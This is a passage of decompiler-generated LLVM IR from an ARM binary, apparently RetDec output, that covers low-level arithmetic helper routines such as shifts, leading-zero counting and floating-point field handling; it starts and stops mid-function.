  br i1 %v4_15b84, label %.thread10, label %bb97

bb97:                                             ; preds = %bb96
  %v5_15b88 = udiv i32 %v1_15b9c, 4
  %v6_15b88 = or i32 %v1_15b88, %v5_15b88
  br label %.thread10

.thread10:                                        ; preds = %bb96, %.thread9, %bb97
  %v1_15b90 = phi i32 [ %v6_15b84, %bb96 ], [ %v1_15b84, %.thread9 ], [ %v6_15b84, %bb97 ]
  %v1_15b94 = phi i32 [ %v1_15b88, %bb96 ], [ %v1_15b88, %.thread9 ], [ %v6_15b88, %bb97 ]
  %v4_15b8c = udiv i32 %v1_15ba0, 8
  %v6_15b8c = icmp ult i32 %v1_15b90, %v4_15b8c
  br i1 %v6_15b8c, label %thread-pre-split12, label %bb98

bb98:                                             ; preds = %.thread10
  %v3_15b90 = and i32 %v1_15ba0, 4
  %v4_15b90 = icmp eq i32 %v3_15b90, 0
  %v6_15b90 = sub i32 %v1_15b90, %v4_15b8c
  br i1 %v4_15b90, label %thread-pre-split12, label %bb99

bb99:                                             ; preds = %bb98
  %v5_15b94 = udiv i32 %v1_15b9c, 8
  %v6_15b94 = or i32 %v1_15b94, %v5_15b94
  br label %thread-pre-split12

thread-pre-split12:                               ; preds = %bb99, %.thread10, %bb98
  %v1_15bac = phi i32 [ %v1_15b94, %bb98 ], [ %v1_15b94, %.thread10 ], [ %v6_15b94, %bb99 ]
  %v0_15b98 = phi i32 [ %v6_15b90, %bb98 ], [ %v1_15b90, %.thread10 ], [ %v6_15b90, %bb99 ]
  %v2_15b98 = icmp eq i32 %v0_15b98, 0
  br i1 %v2_15b98, label %dec_label_pc_15ba8, label %bb100

bb100:                                            ; preds = %thread-pre-split12
  %tmp = icmp ult i32 %v1_15b9c, 16
  br i1 %tmp, label %dec_label_pc_15ba8, label %.thread13

.thread13:                                        ; preds = %bb100
  %v4_15b9c = udiv i32 %v1_15b9c, 16
  %v4_15ba0 = udiv i32 %v1_15ba0, 16
  br label %dec_label_pc_15b68

dec_label_pc_15ba8:                               ; preds = %thread-pre-split12, %bb100
  %v1_15ba8 = icmp slt i32 %v2_15b00, 0
  br i1 %v1_15ba8, label %bb101, label %.thread16

bb101:                                            ; preds = %dec_label_pc_15ba8
  %v2_15bac = sub i32 0, %v1_15bac
  br label %.thread16

.thread16:                                        ; preds = %bb105, %bb104, %bb102, %dec_label_pc_15bb4, %dec_label_pc_15ba8, %bb101
  %v1_15bb0 = phi i32 [ %v1_15bac, %dec_label_pc_15ba8 ], [ %v2_15bac, %bb101 ], [ %v2_15bb8, %bb102 ], [ undef, %dec_label_pc_15bb4 ], [ %v1_15bcc80, %bb104 ], [ %v2_15bc8, %bb105 ]
  ret i32 %v1_15bb0

dec_label_pc_15bb4:                               ; preds = %thread-pre-split
  br i1 %v1_15afc, label %bb102, label %.thread16

bb102:                                            ; preds = %dec_label_pc_15bb4
  %v2_15bb8 = sub i32 0, %v0_15b00
  br label %.thread16

dec_label_pc_15bc0:                               ; preds = %bb87
  br i1 %v3_15b1c, label %bb104, label %bb103

bb103:                                            ; preds = %dec_label_pc_15bc0
  br label %bb104

bb104:                                            ; preds = %dec_label_pc_15bc0, %bb103
  %v1_15bcc80 = phi i32 [ %v0_15b00, %dec_label_pc_15bc0 ], [ 0, %bb103 ]
  br i1 %v9_15b1c, label %bb105, label %.thread16

bb105:                                            ; preds = %bb104
  %v4_15bc4 = ashr i32 %v2_15b00, 31
  %v2_15bc8 = or i32 %v4_15bc4, 1
  br label %.thread16

dec_label_pc_15bd0:                               ; preds = %dec_label_pc_15b24
  %v2_15bd0 = icmp ugt i32 %v1_15bd4, 65535
  br i1 %v2_15bd0, label %bb106, label %.thread19

bb106:                                            ; preds = %dec_label_pc_15bd0
  %v2_15bd4 = and i32 %v1_15bd4, 32768
  %v3_15bd4 = icmp eq i32 %v2_15bd4, 0
  %v4_15bd4 = udiv i32 %v1_15bd4, 65536
  br i1 %v3_15bd4, label %.thread19, label %bb107

.thread19:                                        ; preds = %bb106, %dec_label_pc_15bd0
  %v0_15be070 = phi i32 [ %v1_15bd4, %dec_label_pc_15bd0 ], [ %v4_15bd4, %bb106 ]
  br label %bb107

bb107:                                            ; preds = %bb106, %.thread19
  %v1_15be4 = phi i32 [ %v0_15be070, %.thread19 ], [ %v4_15bd4, %bb106 ]
  %storemerge = phi i32 [ 0, %.thread19 ], [ 16, %bb106 ]
  %v2_15be0 = icmp ugt i32 %v1_15be4, 255
  br i1 %v2_15be0, label %bb108, label %.thread20

bb108:                                            ; preds = %bb107
  %v2_15be4 = and i32 %v1_15be4, 128
  %v3_15be4 = icmp eq i32 %v2_15be4, 0
  %v4_15be4 = udiv i32 %v1_15be4, 256
  br i1 %v3_15be4, label %.thread20, label %bb109

bb109:                                            ; preds = %bb108
  %v2_15be8 = or i32 %storemerge, 8
  br label %.thread20

.thread20:                                        ; preds = %bb108, %bb107, %bb109
  %v1_15bf4 = phi i32 [ %storemerge, %bb107 ], [ %storemerge, %bb108 ], [ %v2_15be8, %bb109 ]
  %v1_15bf0 = phi i32 [ %v1_15be4, %bb107 ], [ %v4_15be4, %bb108 ], [ %v4_15be4, %bb109 ]
  %v2_15bec = icmp ugt i32 %v1_15bf0, 15
  br i1 %v2_15bec, label %bb110, label %.thread21

bb110:                                            ; preds = %.thread20
  %v2_15bf0 = and i32 %v1_15bf0, 8
  %v3_15bf0 = icmp eq i32 %v2_15bf0, 0
  %v4_15bf0 = udiv i32 %v1_15bf0, 16
  br i1 %v3_15bf0, label %.thread21, label %bb111

bb111:                                            ; preds = %bb110
  %v2_15bf4 = add nsw i32 %v1_15bf4, 4
  br label %.thread21

.thread21:                                        ; preds = %bb110, %.thread20, %bb111
  %v4_15bfc = phi i32 [ %v1_15bf4, %.thread20 ], [ %v1_15bf4, %bb110 ], [ %v2_15bf4, %bb111 ]
  %v5_15c00 = phi i32 [ %v1_15bf0, %.thread20 ], [ %v4_15bf0, %bb110 ], [ %v4_15bf0, %bb111 ]
  %v2_15bf8 = icmp ugt i32 %v5_15c00, 3
  %v7_15bf8 = icmp eq i32 %v5_15c00, 4
  %v2_15bfc = xor i1 %v7_15bf8, true
  %v3_15bfc = and i1 %v2_15bf8, %v2_15bfc
  br i1 %v3_15bfc, label %bb112, label %bb113

bb112:                                            ; preds = %.thread21
  %v5_15bfc = add nsw i32 %v4_15bfc, 3
  br label %bb113

bb113:                                            ; preds = %.thread21, %bb112
  %v4_15c00 = phi i32 [ %v4_15bfc, %.thread21 ], [ %v5_15bfc, %bb112 ]
  %v2_15c00 = xor i1 %v2_15bf8, true
  %v3_15c00 = or i1 %v7_15bf8, %v2_15c00
  br i1 %v3_15c00, label %bb114, label %bb115

bb114:                                            ; preds = %bb113
  %v8_15c00 = udiv i32 %v5_15c00, 2
  %v9_15c00 = add i32 %v4_15c00, %v8_15c00
  br label %bb115

bb115:                                            ; preds = %bb113, %bb114
  %v1_15c08 = phi i32 [ %v4_15c00, %bb113 ], [ %v9_15c00, %bb114 ]
  %v1_15c04 = icmp slt i32 %v2_15b00, 0
  %v6_15c08 = lshr i32 %v0_15c08, %v1_15c08
  %v2_15c0c = sub i32 0, %v6_15c08
  %v2_15c0c.v6_15c08 = select i1 %v1_15c04, i32 %v2_15c0c, i32 %v6_15c08
  ret i32 %v2_15c0c.v6_15c08

dec_label_pc_15c14:                               ; preds = %dec_label_pc_15afc
  %v0_15c14 = load i32, i32* @lr, align 4
  %v0_15c18 = call i32 @function_104d8()
  store i32 0, i32* @r0, align 4
  call void @__pseudo_branch(i32 %v0_15c14)
  %v9_15c24 = load i32, i32* @lr, align 4
  %v0_15c28 = call i32 @function_15afc()
  store i32 %v9_15c24, i32* @lr, align 4
  ret i32 %v0_15c28

; uselistorder directives
  uselistorder i32 %v4_15c00, { 1, 0 }
  uselistorder i1 %v7_15bf8, { 1, 0 }
  uselistorder i32 %v4_15bf0, { 1, 0 }
  uselistorder i32 %v1_15bf0, { 1, 0, 2, 3 }
  uselistorder i32 %v4_15be4, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_15be4, { 1, 0, 2, 3 }
  uselistorder i32 %v4_15bd4, { 1, 0 }
  uselistorder i32 %v0_15b98, { 1, 0 }
  uselistorder i32 %v4_15b8c, { 1, 0 }
  uselistorder i32 %v1_15b94, { 1, 2, 0 }
  uselistorder i32 %v4_15b80, { 1, 0 }
  uselistorder i32 %v1_15b88, { 1, 2, 0 }
  uselistorder i32 %v4_15b74, { 1, 0 }
  uselistorder i32 %v1_15b7c, { 1, 2, 0 }
  uselistorder i32 %v1_15ba0, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_15b70, { 1, 0 }
  uselistorder i32 %v1_15b9c, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_15b5c, { 1, 0 }
  uselistorder i32 %v3_15b58, { 1, 0 }
  uselistorder i32 %v1_15b58, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_15b54, { 1, 0 }
  uselistorder i32 %v1_15b5c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_15b48, { 1, 0 }
  uselistorder i32 %v4_15b44, { 2, 1, 0 }
  uselistorder i32 %v1_15b48, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_15b50.pr40, { 1, 2, 0, 5, 4, 3 }
  uselistorder i1 %v3_15b1c, { 1, 0 }
  uselistorder i32 %v1_15bd4, { 5, 1, 6, 7, 3, 2, 0, 4, 8, 9, 10, 11 }
  uselistorder i32 %v2_15b00, { 1, 0, 2 }
  uselistorder i32 %v0_15b00, { 2, 1, 3, 4, 5, 0 }
  uselistorder i32 %v0_15afc, { 2, 1, 0, 4, 3 }
  uselistorder i32 ()* @function_15afc, { 2, 1, 0 }
  uselistorder i32 ()* @function_104d8, { 3, 2, 1, 0 }
  uselistorder i32 268435455, { 2, 3, 0, 4, 1, 5 }
  uselistorder label %bb115, { 1, 0 }
  uselistorder label %bb113, { 1, 0 }
  uselistorder label %.thread21, { 2, 0, 1 }
  uselistorder label %.thread20, { 2, 0, 1 }
  uselistorder label %bb107, { 1, 0 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %.thread16, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_15ba8, { 1, 0 }
  uselistorder label %thread-pre-split12, { 0, 2, 1 }
  uselistorder label %.thread10, { 2, 0, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_15b64, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15b50thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
  uselistorder label %bb87, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @function_15c3c(i32 %arg1) local_unnamed_addr {
dec_label_pc_15c3c:
  %v1_15c3c = sub i32 0, %arg1
  store i32 %v1_15c3c, i32* @r0, align 4
  %v0_15c40 = call i32 @function_15c48()
  ret i32 %v0_15c40

; uselistorder directives
  uselistorder i32 ()* @function_15c48, { 1, 0 }
}

define i32 @function_15c44(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_15c44:
  %v2_15c44 = load i32, i32* @r0, align 4
  ret i32 %v2_15c44
}

define i32 @function_15c48() local_unnamed_addr {
dec_label_pc_15c48:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_15c48 = load i32, i32* @r4, align 4
  store i32 %v3_15c48, i32* %stack_var_-12, align 4
  %v6_15c48 = load i32, i32* @r5, align 4
  %v0_15c4c = load i32, i32* @r0, align 4
  %v2_15c4c = mul i32 %v0_15c4c, 2
  store i32 %v2_15c4c, i32* %r4.global-to-local, align 4
  %v0_15c50 = load i32, i32* @r2, align 4
  %v2_15c50 = mul i32 %v0_15c50, 2
  store i32 %v2_15c50, i32* %r5.global-to-local, align 4
  %v4_15c54 = icmp eq i32 %v2_15c50, %v2_15c4c
  %v1_15c58 = load i32, i32* @r1, align 4
  br i1 %v4_15c54, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_15c48
  %v2_15c58 = load i32, i32* @r3, align 4
  %v5_15c58 = icmp eq i32 %v2_15c58, %v1_15c58
  br i1 %v5_15c58, label %.thread3, label %.thread

.thread:                                          ; preds = %dec_label_pc_15c48, %bb
  %v3_15c5c = or i32 %v1_15c58, %v2_15c4c
  %v5_15c5c = icmp eq i32 %v3_15c5c, 0
  br i1 %v5_15c5c, label %.thread3, label %bb11

bb11:                                             ; preds = %.thread
  %v2_15c60 = load i32, i32* @r3, align 4
  %v3_15c60 = or i32 %v2_15c60, %v2_15c50
  %v5_15c60 = icmp eq i32 %v3_15c60, 0
  br i1 %v5_15c60, label %.thread3, label %bb12

bb12:                                             ; preds = %bb11
  %v2_15c4c.off = add i32 %v2_15c4c, 4194303
  %tmp = icmp ult i32 %v2_15c4c.off, 2097152
  br i1 %tmp, label %.thread3, label %bb13

bb13:                                             ; preds = %bb12
  %v2_15c50.off = add i32 %v2_15c50, 4194303
  %tmp18 = icmp ult i32 %v2_15c50.off, 2097152
  br label %.thread3

.thread3:                                         ; preds = %.thread, %bb, %bb11, %bb12, %bb13
  %v0_15c6c = phi i1 [ true, %bb11 ], [ true, %bb12 ], [ %tmp18, %bb13 ], [ true, %bb ], [ true, %.thread ]
  call void @__pseudo_cond_branch(i1 %v0_15c6c, i32 ptrtoint (i32* @global_var_15e8c.436 to i32))
  %v0_15c70 = load i32, i32* %r4.global-to-local, align 4
  %v3_15c70 = udiv i32 %v0_15c70, 2097152
  store i32 %v3_15c70, i32* @r4, align 4
  %v1_15c74 = load i32, i32* %r5.global-to-local, align 4
  %v4_15c74 = udiv i32 %v1_15c74, 2097152
  %v5_15c74 = sub nsw i32 %v4_15c74, %v3_15c70
  %v5_15c78 = icmp ult i32 %v4_15c74, %v3_15c70
  br i1 %v5_15c78, label %bb14, label %bb15

bb14:                                             ; preds = %.thread3
  %v7_15c78 = sub nsw i32 0, %v5_15c74
  br label %bb15

bb15:                                             ; preds = %.thread3, %bb14
  %storemerge = phi i32 [ %v7_15c78, %bb14 ], [ %v5_15c74, %.thread3 ]
  %v1_15cd8 = phi i32 [ %v7_15c78, %bb14 ], [ %v5_15c74, %.thread3 ]
  store i32 %storemerge, i32* @r5, align 4
  %v7_15c7c = icmp ugt i32 %v4_15c74, %v3_15c70
  br i1 %v7_15c7c, label %dec_label_pc_15c80, label %dec_label_pc_15c9c

dec_label_pc_15c80:                               ; preds = %bb15
  %v2_15c80 = add nsw i32 %v1_15cd8, %v3_15c70
  store i32 %v2_15c80, i32* @r4, align 4
  %v0_15c84 = load i32, i32* @r1, align 4
  %v1_15c84 = load i32, i32* @r3, align 4
  %v0_15c88 = load i32, i32* @r0, align 4
  %v1_15c88 = load i32, i32* @r2, align 4
  store i32 %v1_15c84, i32* @r1, align 4
  store i32 %v1_15c88, i32* %r0.global-to-local, align 4
  store i32 %v0_15c84, i32* @r3, align 4
  store i32 %v0_15c88, i32* @r2, align 4
  br label %dec_label_pc_15c9c

dec_label_pc_15c9c:                               ; preds = %bb15, %dec_label_pc_15c80
  %v0_15cd8 = phi i32 [ %v2_15c80, %dec_label_pc_15c80 ], [ %v3_15c70, %bb15 ]
  %.0 = phi i32 [ %v1_15c88, %dec_label_pc_15c80 ], [ undef, %bb15 ]
  %tmp19 = icmp ugt i32 %v1_15cd8, 54
  br i1 %tmp19, label %bb16, label %bb17

bb16:                                             ; preds = %dec_label_pc_15c9c
  %v6_15ca0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v6_15ca0, i32* @r4, align 4
  store i32 %v6_15c48, i32* @r5, align 4
  ret i32 %.0

bb17:                                             ; preds = %dec_label_pc_15c9c
  %v3_15ca4 = icmp sgt i32 %.0, -1
  %v4_15cb0 = urem i32 %.0, 1048576
  %v5_15cb0 = or i32 %v4_15cb0, 1048576
  store i32 %v5_15cb0, i32* %r0.global-to-local, align 4
  br i1 %v3_15ca4, label %dec_label_pc_15cc0, label %dec_label_pc_15cb8

dec_label_pc_15cb8:                               ; preds = %bb17
  %v0_15cb8 = load i32, i32* @r1, align 4
  %v2_15cb8 = icmp eq i32 %v0_15cb8, 0
  %v2_15cbc = icmp eq i1 %v2_15cb8, false
  %v5_15cbc = sext i1 %v2_15cbc to i32
  %v6_15cbc = sub nsw i32 %v5_15cbc, %v5_15cb0
  store i32 %v6_15cbc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15cc0

dec_label_pc_15cc0:                               ; preds = %bb17, %dec_label_pc_15cb8
  %v0_15cc0 = load i32, i32* @r2, align 4
  %v3_15cc0 = icmp sgt i32 %v0_15cc0, -1
  br i1 %v3_15cc0, label %dec_label_pc_15cd8, label %dec_label_pc_15cd0

dec_label_pc_15cd0:                               ; preds = %dec_label_pc_15cc0
  br label %dec_label_pc_15cd8

dec_label_pc_15cd8:                               ; preds = %dec_label_pc_15cc0, %dec_label_pc_15cd0
  %v4_15cd8 = icmp eq i32 %v0_15cd8, %v1_15cd8
  call void @__pseudo_cond_branch(i1 %v4_15cd8, i32 ptrtoint (i32* @global_var_15e74.437 to i32))
  %v1_15cdc = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_15cdc

; uselistorder directives
  uselistorder i32 %.0, { 1, 0, 2 }
  uselistorder i32 %v1_15c88, { 1, 0 }
  uselistorder i32 %v4_15c74, { 2, 1, 0 }
  uselistorder i32 %v3_15c70, { 4, 5, 3, 2, 1, 0 }
  uselistorder i32 %v1_15c58, { 1, 0 }
  uselistorder i32 %v2_15c50, { 1, 3, 0, 2 }
  uselistorder i32 %v2_15c4c, { 1, 3, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 undef, { 1, 0 }
  uselistorder label %dec_label_pc_15cd8, { 1, 0 }
  uselistorder label %dec_label_pc_15cc0, { 1, 0 }
  uselistorder label %dec_label_pc_15c9c, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %.thread3, { 4, 3, 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_15ce0() local_unnamed_addr {
dec_label_pc_15ce0:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v0_15ce0 = load i32, i32* @r4, align 4
  %v1_15ce0 = add i32 %v0_15ce0, -1
  store i32 %v1_15ce0, i32* @r4, align 4
  %v0_15ce4 = load i32, i32* @r5, align 4
  %v1_15ce4 = sub i32 32, %v0_15ce4
  %v5_15ce8 = icmp sgt i32 %v0_15ce4, 32
  br i1 %v5_15ce8, label %dec_label_pc_15d04, label %dec_label_pc_15cec

dec_label_pc_15cec:                               ; preds = %dec_label_pc_15ce0
  %v0_15cec = load i32, i32* @r3, align 4
  %v6_15cec = shl i32 %v0_15cec, %v1_15ce4
  store i32 %v6_15cec, i32* %ip.global-to-local, align 4
  %v0_15cf0 = load i32, i32* @r1, align 4
  %v3_15cf0 = add i32 %v0_15ce4, -1
  %v4_15cf0 = shl i32 1, %v3_15cf0
  %v7_15cf0 = lshr i32 %v0_15cec, %v0_15ce4
  %v8_15cf0 = add i32 %v0_15cf0, %v7_15cf0
  %v9_15cf0 = icmp ult i32 %v8_15cf0, %v0_15cf0
  %v0_15cf4 = load i32, i32* @r0, align 4
  %v2_15cf4 = zext i1 %v9_15cf0 to i32
  %v3_15cf4 = add i32 %v2_15cf4, %v0_15cf4
  %v1_15cf8 = load i32, i32* @r2, align 4
  %v7_15cf8 = shl i32 %v1_15cf8, %v1_15ce4
  %v8_15cf8 = add i32 %v7_15cf8, %v8_15cf0
  store i32 %v8_15cf8, i32* %r1.global-to-local, align 4
  %v5_15cfc = and i32 %v1_15cf8, %v4_15cf0
  %v6_15cfc = icmp ne i32 %v5_15cfc, 0
  %v7_15cfc = ashr i32 %v1_15cf8, %v0_15ce4
  %v9_15cfc = add i32 %v3_15cf4, %v7_15cfc
  %v10_15cfc = zext i1 %v6_15cfc to i32
  %v11_15cfc = add i32 %v10_15cfc, %v9_15cfc
  br label %dec_label_pc_15d20

dec_label_pc_15d04:                               ; preds = %dec_label_pc_15ce0
  %v1_15d04 = add i32 %v0_15ce4, -32
  %v1_15d08 = add i32 %v1_15ce4, 32
  %v0_15d10 = load i32, i32* @r2, align 4
  %v2_15d10 = add i32 %v1_15ce4, 31
  %v3_15d10 = lshr i32 -2147483648, %v2_15d10
  %v4_15d10 = and i32 %v0_15d10, %v3_15d10
  %v5_15d10 = icmp ne i32 %v4_15d10, 0
  %v6_15d10 = shl i32 %v0_15d10, %v1_15d08
  %v2_15d14 = or i32 %v6_15d10, 2
  %v2_15d14.v6_15d10 = select i1 %v5_15d10, i32 %v2_15d14, i32 %v6_15d10
  store i32 %v2_15d14.v6_15d10, i32* %ip.global-to-local, align 4
  %v0_15d18 = load i32, i32* @r1, align 4
  %v7_15d18 = ashr i32 %v0_15d10, %v1_15d04
  %v8_15d18 = add i32 %v0_15d18, %v7_15d18
  store i32 %v8_15d18, i32* %r1.global-to-local, align 4
  %v0_15d1c = load i32, i32* @r0, align 4
  %v2_15d1c = and i32 %v0_15d10, 1073741824
  %v3_15d1c = icmp ne i32 %v2_15d1c, 0
  %v4_15d1c = ashr i32 %v0_15d10, 31
  %v6_15d1c = add i32 %v0_15d1c, %v4_15d1c
  %v7_15d1c = zext i1 %v3_15d1c to i32
  %v8_15d1c = add i32 %v6_15d1c, %v7_15d1c
  br label %dec_label_pc_15d20

dec_label_pc_15d20:                               ; preds = %dec_label_pc_15cec, %dec_label_pc_15d04
  %storemerge = phi i32 [ %v11_15cfc, %dec_label_pc_15cec ], [ %v8_15d1c, %dec_label_pc_15d04 ]
  %v0_15d20 = phi i32 [ %v11_15cfc, %dec_label_pc_15cec ], [ %v8_15d1c, %dec_label_pc_15d04 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v1_15d20 = and i32 %v0_15d20, -2147483648
  store i32 %v1_15d20, i32* @r5, align 4
  %v1_15d24 = icmp sgt i32 %v0_15d20, -1
  call void @__pseudo_cond_branch(i1 %v1_15d24, i32 ptrtoint (i32* @global_var_15d34.438 to i32))
  %v0_15d28 = load i32, i32* %ip.global-to-local, align 4
  %v1_15d28 = sub i32 0, %v0_15d28
  store i32 %v1_15d28, i32* %ip.global-to-local, align 4
  %v2_15d28 = icmp eq i32 %v0_15d28, 0
  %v0_15d2c = load i32, i32* %r1.global-to-local, align 4
  %v2_15d2c = icmp eq i1 %v2_15d28, false
  %v5_15d2c = sext i1 %v2_15d2c to i32
  %v6_15d2c = sub i32 %v5_15d2c, %v0_15d2c
  store i32 %v6_15d2c, i32* @r1, align 4
  %v7_15d2c = zext i1 %v2_15d2c to i32
  %v8_15d2c = icmp ne i32 %v6_15d2c, %v7_15d2c
  %v9_15d2c = icmp ne i32 %v0_15d2c, -1
  %v10_15d2c = or i1 %v9_15d2c, %v8_15d2c
  %v11_15d2c = icmp ne i32 %v0_15d2c, 0
  %v12_15d2c = select i1 %v2_15d2c, i1 %v10_15d2c, i1 %v11_15d2c
  %v0_15d30 = load i32, i32* %r0.global-to-local, align 4
  %v5_15d30 = sext i1 %v12_15d2c to i32
  %v6_15d30 = sub i32 %v5_15d30, %v0_15d30
  store i32 %v6_15d30, i32* %r0.global-to-local, align 4
  ret i32 %v6_15d30

; uselistorder directives
  uselistorder i1 %v2_15d2c, { 1, 2, 0 }
  uselistorder i32 %v0_15d2c, { 1, 2, 0 }
  uselistorder i32 %v8_15d1c, { 1, 0 }
  uselistorder i32 %v0_15d10, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v11_15cfc, { 1, 0 }
  uselistorder i32 %v1_15cf8, { 1, 0, 2 }
  uselistorder i32 %v0_15cf0, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_15d20, { 1, 0 }
}

define i32 @function_15d34(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_15d34:
  %r0.global-to-local = alloca i32, align 4
  %tmp = trunc i64 %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_15d38 = icmp ult i32 %arg1, 1048574
  br i1 %v3_15d38, label %dec_label_pc_15d78, label %dec_label_pc_15d3c

dec_label_pc_15d3c:                               ; preds = %dec_label_pc_15d34
  %v3_15d40 = icmp ult i32 %arg1, 2097150
  br i1 %v3_15d40, label %dec_label_pc_15d60, label %dec_label_pc_15d44

dec_label_pc_15d44:                               ; preds = %dec_label_pc_15d3c
  %v1_15d44 = urem i32 %arg1, 2
  %v2_15d44 = icmp ne i32 %v1_15d44, 0
  %v3_15d44 = udiv i32 %arg1, 2
  store i32 %v3_15d44, i32* %r0.global-to-local, align 4
  %v0_15d48 = load i32, i32* @r1, align 4
  %v3_15d48 = zext i1 %v2_15d44 to i32
  %v6_15d48 = zext i32 %v0_15d48 to i64
  %v7_15d48 = sub i32 33, %v0_15d48
  %v8_15d48 = zext i32 %v7_15d48 to i64
  %v9_15d48 = shl i64 %v6_15d48, %v8_15d48
  %v10_15d48 = sub i32 32, %v0_15d48
  %v11_15d48 = shl i32 %v3_15d48, %v10_15d48
  %v12_15d48 = zext i32 %v11_15d48 to i64
  %v14_15d48 = or i64 %v12_15d48, %v9_15d48
  %v15_15d48 = trunc i64 %v14_15d48 to i32
  %v16_15d48 = add i32 %v0_15d48, -1
  %v17_15d48 = shl i32 1, %v16_15d48
  %v18_15d48 = and i32 %v17_15d48, %v0_15d48
  %v19_15d48 = icmp ne i32 %v18_15d48, 0
  store i32 %v15_15d48, i32* @r1, align 4
  %v0_15d4c = load i32, i32* @ip, align 4
  %v3_15d4c = zext i1 %v19_15d48 to i32
  %v6_15d4c = zext i32 %v0_15d4c to i64
  %v7_15d4c = sub i32 33, %v0_15d4c
  %v8_15d4c = zext i32 %v7_15d4c to i64
  %v9_15d4c = shl i64 %v6_15d4c, %v8_15d4c
  %v10_15d4c = sub i32 32, %v0_15d4c
  %v11_15d4c = shl i32 %v3_15d4c, %v10_15d4c
  %v12_15d4c = zext i32 %v11_15d4c to i64
  %v14_15d4c = or i64 %v12_15d4c, %v9_15d4c
  %v15_15d4c = trunc i64 %v14_15d4c to i32
  store i32 %v15_15d4c, i32* @ip, align 4
  %v0_15d50 = load i32, i32* @r4, align 4
  %v1_15d50 = add i32 %v0_15d50, 1
  store i32 %v1_15d50, i32* @r4, align 4
  %v3_15d54 = mul i32 %v1_15d50, 2097152
  %v2_15d58 = icmp ugt i32 %v3_15d54, -4194305
  call void @__pseudo_cond_branch(i1 %v2_15d58, i32 ptrtoint (i32* @global_var_15eec.439 to i32))
  br label %dec_label_pc_15d60

dec_label_pc_15d60:                               ; preds = %dec_label_pc_15d78, %dec_label_pc_15d3c, %dec_label_pc_15d44
  %v0_15d60 = load i32, i32* @ip, align 4
  %v2_15d60 = icmp slt i32 %v0_15d60, 0
  %v6_15d60 = icmp eq i32 %v0_15d60, -2147483648
  %v1_15d64 = load i32, i32* @r1, align 4
  br i1 %v6_15d60, label %bb, label %dec_label_pc_15d60._crit_edge

bb:                                               ; preds = %dec_label_pc_15d60
  %v2_15d64 = urem i32 %v1_15d64, 2
  %v3_15d64 = icmp ne i32 %v2_15d64, 0
  br label %dec_label_pc_15d60._crit_edge

dec_label_pc_15d60._crit_edge:                    ; preds = %dec_label_pc_15d60, %bb
  %v1_15d68 = phi i1 [ %v3_15d64, %bb ], [ %v2_15d60, %dec_label_pc_15d60 ]
  %v2_15d68 = zext i1 %v1_15d68 to i32
  %v3_15d68 = add i32 %v2_15d68, %v1_15d64
  store i32 %v3_15d68, i32* @r1, align 4
  %v0_15d6c = load i32, i32* %r0.global-to-local, align 4
  %v1_15d6c = load i32, i32* @r4, align 4
  %v2_15d6c = and i32 %v1_15d6c, 4096
  %v3_15d6c = icmp ne i32 %v2_15d6c, 0
  %v4_15d6c = mul i32 %v1_15d6c, 1048576
  %v6_15d6c = add i32 %v4_15d6c, %v0_15d6c
  %v7_15d6c = zext i1 %v3_15d6c to i32
  %v8_15d6c = add i32 %v7_15d6c, %v6_15d6c
  %v1_15d70 = load i32, i32* @r5, align 4
  %v2_15d70 = or i32 %v1_15d70, %v8_15d6c
  store i32 %v2_15d70, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  ret i32 %v2_15d70

dec_label_pc_15d78:                               ; preds = %dec_label_pc_15d34
  %v0_15d78 = load i32, i32* @ip, align 4
  %v1_15d78 = icmp slt i32 %v0_15d78, 0
  %v2_15d78 = mul i32 %v0_15d78, 2
  store i32 %v2_15d78, i32* @ip, align 4
  %v0_15d7c = load i32, i32* @r1, align 4
  %v3_15d7c = mul i32 %v0_15d7c, 2
  %v4_15d7c = zext i1 %v1_15d78 to i32
  %v5_15d7c = or i32 %v3_15d7c, %v4_15d7c
  store i32 %v5_15d7c, i32* @r1, align 4
  %v9_15d7c = icmp ule i32 %v5_15d7c, %v0_15d7c
  %v10_15d7c = icmp ult i32 %v3_15d7c, %v0_15d7c
  %v11_15d7c = select i1 %v1_15d78, i1 %v9_15d7c, i1 %v10_15d7c
  %v3_15d80 = mul i32 %arg1, 2
  %v4_15d80 = zext i1 %v11_15d7c to i32
  %v5_15d80 = or i32 %v4_15d80, %v3_15d80
